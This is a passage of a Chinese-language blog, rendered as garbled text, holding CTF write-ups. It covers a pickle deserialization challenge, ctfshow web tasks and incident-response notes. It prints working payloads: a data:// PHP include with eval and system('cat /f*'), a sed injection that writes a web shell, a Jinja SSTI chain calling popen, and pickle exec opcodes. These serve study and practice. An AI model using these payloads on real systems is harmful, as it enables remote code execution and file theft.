class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> pickle_data <span class="keyword">or</span> <span class="string">b&quot;secret&quot;</span> <span class="keyword">in</span> pickle_data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You damm hacker!&quot;</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -rf *py*&quot;</span>)</span><br><span class="line">    userdata=pickle.loads(pickle_data)</span><br><span class="line">    <span class="keyword">if</span> userdata.token!=<span class="built_in">hash</span>(get_password(userdata.username)):</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;Login First&quot;</span></span><br><span class="line">    <span class="keyword">if</span> userdata.username==<span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome admin, here is your next challenge!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;You&#x27;re not admin!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    resp = make_response(<span class="string">&quot;success&quot;</span>) </span><br><span class="line">    session[<span class="string">&quot;password&quot;</span>]=request.values.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">&quot;userdata&quot;</span>, base64.b64encode(pickle.dumps(User(request.values.get(<span class="string">&quot;username&quot;</span>),request.values.get(<span class="string">&quot;password&quot;</span>)),<span class="number">2</span>)), max_age=<span class="number">3600</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;source.txt&#x27;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>é¢˜ç›®ä»£ç <br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436#toc-0">pickleååºåˆ—åŒ–æ¼æ´å­¦ä¹ </a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7012">é€šè¿‡ASTæ¥æ„é€ Pickle opcode</a><br> pickletools<br> ä½¿ç”¨pickletoolså¯ä»¥æ–¹ä¾¿çš„å°†opcodeè½¬åŒ–ä¸ºä¾¿äºè‚‰çœ¼è¯»å–çš„å½¢å¼</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">data=<span class="string">b&quot;\x80\x03cbuiltins\nexec\nq\x00X\x13\x00\x00\x00key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;q\x01\x85q\x02Rq\x03.&quot;</span></span><br><span class="line">pickletools.dis(data)</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: c    GLOBAL     <span class="string">&#x27;builtins exec&#x27;</span></span><br><span class="line">   <span class="number">17</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">19</span>: X    BINUNICODE <span class="string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span></span><br><span class="line">   <span class="number">43</span>: q    BINPUT     <span class="number">1</span></span><br><span class="line">   <span class="number">45</span>: \x85 TUPLE1</span><br><span class="line">   <span class="number">46</span>: q    BINPUT     <span class="number">2</span></span><br><span class="line">   <span class="number">48</span>: R    REDUCE</span><br><span class="line">   <span class="number">49</span>: q    BINPUT     <span class="number">3</span></span><br><span class="line">   <span class="number">51</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>æˆªå–æºç å…³é”®è·¯ç”±ä»£ç ï¼Œåœ¨è¯¥è·¯ç”±ä¸‹é¦–å…ˆé€šè¿‡cookieæ¥æ”¶åºåˆ—ä»£ç <br>åˆ©ç”¨oæ¥ç»•è¿‡Ré™åˆ¶<br>é¦–å…ˆè¿›è¡Œå˜é‡è¦†ç›–</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aa=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;import admin;admin.sec&quot;+&quot;ret=&#x27;</span>shanghe<span class="string">&#x27;;&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">OBJ(GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>),aa)</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨pkerè¿›è¡Œopcodeæ„é€ <br>ä¹‹åbase64åæ”¾å…¥cookieä¸­ï¼Œç™»å½•å³å¯<br>ï¼ˆæŠ¥500æ˜¯æ­£å¸¸çš„ï¼‰<br>ä¹‹åç™»å½• å¼„å‡º504å³å¯<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/uh7ZvBIQv9fWXzS5Uc-fXQ">wp</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/07/22/ctfshow%E5%8D%95%E8%BA%AB%E6%9D%AF%20web/">ctfshowå•èº«æ¯ web</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-07-22</time><div class="content"><h2 id="webç­¾åˆ°"><a href="#webç­¾åˆ°" class="headerlink" title="webç­¾åˆ°"></a>webç­¾åˆ°</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strrev(<span class="variable">$file</span>)==<span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ³¨é‡Šï¼šstrrevï¼ˆï¼‰å‡½æ•°å¯ä»¥åè½¬å­—ç¬¦ä¸²<br>æ–‡ä»¶åŒ…å«   åˆ©ç”¨dataä¼ªåè®®<br>dataä¼ªåè®®å°±æ˜¯æŠŠä¸€äº›ä½“é‡æ¯”è¾ƒå°çš„æ•°æ®ç›´æ¥åµŒå…¥åœ¨é¡µé¢é‡Œï¼Œè€Œä¸ä½¿ç”¨å¤–éƒ¨é“¾æ¥ã€‚ data:text/plain æ˜¯åµŒå…¥æ–‡æœ¬<br>è¿˜æœ‰ä¸€ç‚¹ï¼šæœ¬é¢˜ä¹Ÿæ˜¯åˆ©ç”¨?&gt;è¿›è¡Œæˆªæ–­<br>äºæ˜¯åˆ©ç”¨payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> eval($_POST[1]);<span class="meta">?&gt;</span>&gt;?;)]1[TSOP_$(lave php?&lt;,nialp/txet//:atad&amp;1=system(&quot;cat /f*&quot;);</span></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°flag</p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$param</span>))&#123;</span><br><span class="line">    <span class="variable">$cmd</span>=escapeshellcmd(substr(<span class="variable">$cmd</span>,<span class="number">0</span>,<span class="number">3</span>)).<span class="string">&quot; &quot;</span>.escapeshellarg(<span class="variable">$param</span>).<span class="string">&quot; &quot;</span>.<span class="keyword">__FILE__</span>;</span><br><span class="line">    shell_exec(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å‡½æ•°ä»‹ç»ï¼š<br>escapeshellcmd</p>
<blockquote>
<p>(PHP 4, PHP 5, PHP 7, PHP 8)<br>escapeshellcmd â€” shell å…ƒå­—ç¬¦è½¬ä¹‰<br>è¯´æ˜ escapeshellcmd(string $command): string escapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª—<br>shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦<br>ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚<br>åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A å’Œ \xFFã€‚ â€™ å’Œ â€œ<br>ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</p>
</blockquote>
<p>escapeshellarg<br>ä¿è¯ä¼ å…¥å­—ç¬¦ä¸²</p>
<blockquote>
<p>(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7, PHP 8)<br>escapeshellarg â€” æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°<br>è¯´æ˜ escapeshellarg(string $arg): string escapeshellarg()<br>å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell<br>å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦ ã€‚</p>
</blockquote>
<p>åˆ©ç”¨sedè¿›è¡Œè§£é¢˜</p>
<p><a target="_blank" rel="noopener" href="https://www.twle.cn/c/yufei/sed/sed-basic-regular-expressions.html">sedä»‹ç»</a><br>sedå·¥ä½œæµç¨‹</p>
<blockquote>
<p>è¯»å–è¡Œ -&gt; æ‰§è¡Œ -&gt; æ˜¾ç¤º -&gt; è¯»å–è¡Œ -&gt; æ‰§è¡Œ -&gt; æ˜¾ç¤º -&gt; â€¦ -&gt; è¯»å–è¡Œ -&gt; æ‰§è¡Œ -&gt; æ˜¾ç¤º</p>
</blockquote>
<blockquote>
<p>sed ä»è¾“å…¥æµ ï¼ˆæ–‡ä»¶ã€ç®¡é“ã€æ ‡å‡†è¾“å…¥æµï¼‰ä¸­è¯»å– ä¸€è¡Œ å¹¶å­˜å‚¨åœ¨åå« pattern buffer çš„å†…éƒ¨ç¼“å†²åŒºä¸­ã€‚<br>sed è¿˜åœ¨å†…å­˜ä¸Šå¼€è¾Ÿäº†å¦ä¸€ä¸ªç§æœ‰çš„ç¼“å†²åŒº hold buffer ç”¨äºä¿å­˜å¤„ç†åçš„æ•°æ®ä»¥ä¾›ä»¥åæ£€ç´¢ã€‚<br>æ¯ä¸€ä¸ªå‘¨æœŸæ‰§è¡Œç»“æŸï¼Œsed ä¼šæ¸…ç©º pattern buffer ç¼“å†²åŒºçš„å†…å®¹ï¼Œä½† hold buffer ç¼“å†²åŒºçš„å†…å®¹å¹¶ä¸ä¼šæ¸…ç©ºã€‚<br>hold buffer ç¼“å†²åŒºç”¨äºå­˜å‚¨å¤„ç†åæ•°æ®ï¼Œsed å‘½ä»¤å¹¶ä¸ä¼šå¯¹è¿™é‡Œçš„æ•°æ®å¤„ç†ã€‚</p>
</blockquote>
<p>æœ¬ç€éœ€è¦ä»€ä¹ˆå­¦ä»€ä¹ˆçš„åˆå¿ƒ<br>æˆ‘ä»¬ç›´æ¥çœ‹payloadæ¥å­¦ä¹ </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=sed&amp;param=/esca/d;s/shell_exec/system/g;w <span class="number">1</span>.php</span><br></pre></td></tr></table></figure>
<p>sedæ”¯æŒæ­£åˆ™åŒ¹é… /esca/åŒ¹é…åˆ° escapeè¡Œ d å°†å…¶åˆ é™¤<br>sedè¯­å¥ç”¨ï¼›é—´éš”å¼€<br>så­—ç¬¦ä¸²æ›¿æ¢ shell_exec -&gt; system<br>gä¸ºå…¨å±€æ›¿æ¢æ ‡å¿—</p>
<blockquote>
<p>g æ ‡å¿—é€šå¸¸ç§°ä¸º å…¨å±€æ›¿æ¢æ ‡å¿—ã€‚<br>ä½¿ç”¨äº†å…¨å±€æ›¿æ¢æ ‡å¿—çš„æ›¿æ¢åˆç§°ä¸º è´ªå©ªæ¨¡å¼ã€‚<br>å…¨å±€æ›¿æ¢æ ‡å¿— g çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹<br>[address1[,address2]]s/search/replacement/g</p>
</blockquote>
<p>w å†™å…¥ â€“&gt;å¯ä»¥çœ‹ä½œcpçš„åŠŸèƒ½ç‰ˆ</p>
<h2 id="å§»ç¼˜æµ‹è¯•"><a href="#å§»ç¼˜æµ‹è¯•" class="headerlink" title="å§»ç¼˜æµ‹è¯•"></a>å§»ç¼˜æµ‹è¯•</h2><p>/souceå‘ç°hint<br><img src="https://img-blog.csdnimg.cn/34d4d7a15509431a823b7cb4a8b07873.png"><br>è¿™é‡Œç”¨äº†and,å‘ç°å¤§æ‹¬å·ä¸èƒ½åŒæ—¶å‡ºç°<br>åˆ©ç”¨â€˜â€™è¿›è¡Œåˆ†å‰²<br>åˆ©ç”¨payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/result?boy_name=&#123;&#123;<span class="string">&#x27;&amp;girl_name=&#x27;</span>.<span class="keyword">__class__</span>.__base__.__subclasses__()[<span class="number">82</span>].__init__.__globals__.__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /f*&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/4fd1f2cbc5144db4b2426f9eba715985.png"></p>
<blockquote>
<p>__class__ç”¨äºè¿”å›å¯¹è±¡æ‰€å±çš„ç±»<br>__base__ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›ä¸€ä¸ªç±»æ‰€ç»§æ‰¿çš„ç±»<br>__mro__è¿”å›è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºï¼ŒæŒ‰ç…§å­ç±»åˆ°çˆ¶ç±»åˆ°çˆ¶çˆ¶ç±»çš„é¡ºåºè¿”å›æ‰€æœ‰ç±»<br><strong>subclasses</strong>()è·å–ç±»çš„æ‰€æœ‰å­ç±»<br>__int__æ‰€æœ‰è‡ªå¸¦å¸¦ç±»éƒ½åŒ…å«initæ–¹æ³•ï¼Œå¹¶ä¸”å¸¸ç”¨å®ƒå½“è·³æ¿è°ƒç”¨globals<br>__globals__ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨æ¨¡å—ï¼Œæ–¹æ³•å’Œå…¨å±€å˜é‡ï¼Œç”¨äºé…åˆinitä½¿ç”¨</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/devil8123665/article/details/114598529">SSTIè®²è§£</a></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>ä¸‹è½½å‹ç¼©åŒ…  è¿›è¡Œæš´åŠ›ç ´è§£<br><img src="https://img-blog.csdnimg.cn/384610aff89042a0aabdfc8d98c12272.png"><br>å¾—åˆ°å¯†ç 61f@X<br>è§£å‹å¾—åˆ°å›¾ç‰‡<br>åˆ©ç”¨winhexæŸ¥çœ‹å‘ç°æœ‰ä¸€ä¸²base64ç¼–ç <br><img src="https://img-blog.csdnimg.cn/a2bd2150d1f545bdb487fb1fc829bb40.png"><br>å¾—åˆ°ä¸å®Œå…¨çš„å›¾ç‰‡  å¯¹å…¶è¿›è¡Œè¡¥å…¨æ‰«æ<br>æ‰«æå¾—åˆ°ä¸€åŠflag<br>å¦ä¸€åŠåœ¨åˆ©ç”¨sbæ‰“å¼€å¾—åˆ°<br>æœ€åè®°å¾—çœ‹æç¤ºä¸­å°†ç©ºæ ¼æ›¿æ¢ä¸º_</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/06/19/%E6%8A%A4%E7%BD%91%EF%BC%88%E4%B8%80%EF%BC%89/">æŠ¤ç½‘ï¼ˆä¸€ï¼‰</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-06-19</time><div class="content"><h2 id="åº”æ€¥å“åº”"><a href="#åº”æ€¥å“åº”" class="headerlink" title="åº”æ€¥å“åº”"></a>åº”æ€¥å“åº”</h2><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><h5 id="1ã€æŸ¥çœ‹ç³»ç»Ÿè´¦æˆ·æ˜¯å¦å®‰å…¨"><a href="#1ã€æŸ¥çœ‹ç³»ç»Ÿè´¦æˆ·æ˜¯å¦å®‰å…¨" class="headerlink" title="1ã€æŸ¥çœ‹ç³»ç»Ÿè´¦æˆ·æ˜¯å¦å®‰å…¨"></a>1ã€æŸ¥çœ‹ç³»ç»Ÿè´¦æˆ·æ˜¯å¦å®‰å…¨</h5><p>æ¯”å¦‚çœ‹çœ‹æœåŠ¡å™¨æ˜¯å¦æœ‰å¼±å£ä»¤ï¼Œçœ‹çœ‹è¿œç¨‹ç«¯å£æ˜¯å¦å¯¹å…¬ç½‘å¼€æ”¾ï¼Œï¼Œä¹‹åçœ‹çœ‹æœåŠ¡å™¨æ˜¯ä¸æ˜¯æœ‰å¯ç–‘è´¦æˆ·ï¼Œã€æ–°å¢è´¦æˆ·</p>
<h5 id="2ã€çœ‹çœ‹æ˜¯å¦å…·æœ‰å¼‚å¸¸ç«¯å£ã€è¿›ç¨‹"><a href="#2ã€çœ‹çœ‹æ˜¯å¦å…·æœ‰å¼‚å¸¸ç«¯å£ã€è¿›ç¨‹" class="headerlink" title="2ã€çœ‹çœ‹æ˜¯å¦å…·æœ‰å¼‚å¸¸ç«¯å£ã€è¿›ç¨‹"></a>2ã€çœ‹çœ‹æ˜¯å¦å…·æœ‰å¼‚å¸¸ç«¯å£ã€è¿›ç¨‹</h5><p>æŸ¥çœ‹ç«¯å£è¿æ¥æƒ…å†µï¼Œæ˜¯å¦æœ‰è¿œç¨‹è¿æ¥ã€å¯ç–‘è¿æ¥</p>
<p>æ’æŸ¥å¯ç–‘è¿›ç¨‹ï¼ˆå¯ä»¥åˆ©ç”¨Dç›¾å·¥å…·è¿›è¡Œæ’æŸ¥ï¼Œæˆ–è€…æ‰‹åŠ¨æ‰“å¼€è¿›ç¨‹ç®¡ç†å™¨è¿›è¡Œæ’æŸ¥ï¼‰</p>
<h5 id="3ã€æ£€æŸ¥å¯åŠ¨é¡¹ã€ä»»åŠ¡è®¡åˆ’ã€æœåŠ¡"><a href="#3ã€æ£€æŸ¥å¯åŠ¨é¡¹ã€ä»»åŠ¡è®¡åˆ’ã€æœåŠ¡" class="headerlink" title="3ã€æ£€æŸ¥å¯åŠ¨é¡¹ã€ä»»åŠ¡è®¡åˆ’ã€æœåŠ¡"></a>3ã€æ£€æŸ¥å¯åŠ¨é¡¹ã€ä»»åŠ¡è®¡åˆ’ã€æœåŠ¡</h5><p>çœ‹çœ‹æ˜¯å¦å…·æœ‰å¼‚å¸¸å¯åŠ¨é¡¹ï¼Œçœ‹çœ‹è®¡åˆ’ä»»åŠ¡ã€æœåŠ¡è‡ªå¯åŠ¨ï¼Œæœ‰æ²¡æœ‰å¼‚å¸¸çš„æœåŠ¡è‡ªåŠ¨å¯åŠ¨</p>
<h5 id="4ã€ä¹‹åçœ‹çœ‹æ˜¯å¦å…·æœ‰å¯ç–‘æ–‡ä»¶ã€ç›®å½•"><a href="#4ã€ä¹‹åçœ‹çœ‹æ˜¯å¦å…·æœ‰å¯ç–‘æ–‡ä»¶ã€ç›®å½•" class="headerlink" title="4ã€ä¹‹åçœ‹çœ‹æ˜¯å¦å…·æœ‰å¯ç–‘æ–‡ä»¶ã€ç›®å½•"></a>4ã€ä¹‹åçœ‹çœ‹æ˜¯å¦å…·æœ‰å¯ç–‘æ–‡ä»¶ã€ç›®å½•</h5><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><h5 id="1ã€æŸ¥çœ‹è´¦å·æ˜¯å¦å®‰å…¨"><a href="#1ã€æŸ¥çœ‹è´¦å·æ˜¯å¦å®‰å…¨" class="headerlink" title="1ã€æŸ¥çœ‹è´¦å·æ˜¯å¦å®‰å…¨"></a>1ã€æŸ¥çœ‹è´¦å·æ˜¯å¦å®‰å…¨</h5><p>/etc/passwd  çœ‹ç”¨æˆ·ä¿¡æ¯</p>
<p>/etc/shadowçœ‹å¯†ç </p>
<h5 id="2ã€é€šè¿‡-bash-historyæŸ¥çœ‹å¸å·æ‰§è¡Œè¿‡çš„ç³»ç»Ÿå‘½ä»¤"><a href="#2ã€é€šè¿‡-bash-historyæŸ¥çœ‹å¸å·æ‰§è¡Œè¿‡çš„ç³»ç»Ÿå‘½ä»¤" class="headerlink" title="2ã€é€šè¿‡.bash_historyæŸ¥çœ‹å¸å·æ‰§è¡Œè¿‡çš„ç³»ç»Ÿå‘½ä»¤"></a>2ã€é€šè¿‡.bash_historyæŸ¥çœ‹å¸å·æ‰§è¡Œè¿‡çš„ç³»ç»Ÿå‘½ä»¤</h5><h5 id="3ã€çœ‹ç«¯å£ã€è¿›ç¨‹ã€å¼€æœºå¯åŠ¨é¡¹ã€å®šæ—¶ä»»åŠ¡ï¼ˆcrontab-iï¼‰"><a href="#3ã€çœ‹ç«¯å£ã€è¿›ç¨‹ã€å¼€æœºå¯åŠ¨é¡¹ã€å®šæ—¶ä»»åŠ¡ï¼ˆcrontab-iï¼‰" class="headerlink" title="3ã€çœ‹ç«¯å£ã€è¿›ç¨‹ã€å¼€æœºå¯åŠ¨é¡¹ã€å®šæ—¶ä»»åŠ¡ï¼ˆcrontab -iï¼‰"></a>3ã€çœ‹ç«¯å£ã€è¿›ç¨‹ã€å¼€æœºå¯åŠ¨é¡¹ã€å®šæ—¶ä»»åŠ¡ï¼ˆcrontab -iï¼‰</h5><h5 id="4ã€æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶"><a href="#4ã€æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶" class="headerlink" title="4ã€æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶"></a>4ã€æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶</h5><p>åé—¨å¸¸æ”¾ä½ç½®ï¼ˆ**/tmp** ã€**/etc/rc.**local  æœ‰æ—¶å¯ä»¥è¯»å‡ºæ¥<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020">apache</a>çš„è·¯å¾„ï¼‰</p>
<p><strong>crontab  log</strong></p>
<h2 id="sqlmapåŸç†"><a href="#sqlmapåŸç†" class="headerlink" title="sqlmapåŸç†"></a>sqlmapåŸç†</h2><p>â€‹    å®ƒçš„å·¥ä½œåŸç†å’Œæ‰‹å·¥æ³¨å…¥çš„åŸç†æ˜¯ä¸€æ ·çš„ï¼šæ£€æµ‹åŠ¨æ€é¡µé¢ä¸­get/postå‚æ•°ã€cookieã€ httpå¤´ï¼Œå¹¶çˆ†å‡ºæ•°æ®ï¼Œä¸éœ€è¦æˆ‘ä»¬å†æ‰‹åŠ¨å†™payloadï¼Œå› ä¸ºå®ƒæœ‰éå¸¸å¼ºå¤§çš„å¼•æ“ï¼Œå„ç§å„æ ·çš„å‚æ•°ã€å„ç§å„æ ·çš„ä½ç½®ï¼Œå®ƒéƒ½å¯ä»¥å»å®ŒæˆSQLæ³¨å…¥æ¼æ´çš„æ£€æµ‹ã€åˆ©ç”¨ã€ä»¥åŠæ•°æ®çš„æå–</p>
<h4 id="sqlmap-os-shellåŸç†"><a href="#sqlmap-os-shellåŸç†" class="headerlink" title="sqlmap -os -shellåŸç†"></a>sqlmap -os -shellåŸç†</h4><p>â€‹        åŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯ç”¨into outfileå‡½æ•°å°†ä¸€ä¸ªå¯ä»¥ç”¨æ¥ä¸Šä¼ çš„phpæ–‡ä»¶å†™åˆ°ç½‘ç«™çš„ç›®å½•ä¸‹ï¼Œç„¶ååˆ©ç”¨tmpukjhb.phpä¸Šä¼ äº†ä¸€ä¸ªtmpbezal.phpçš„æ–‡ä»¶ï¼Œtmpbezal.phpè¿™ä¸ªæ–‡ä»¶å¯ä»¥ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶ä¸”å°†ç»“æœè¿”å›å‡ºæ¥</p>
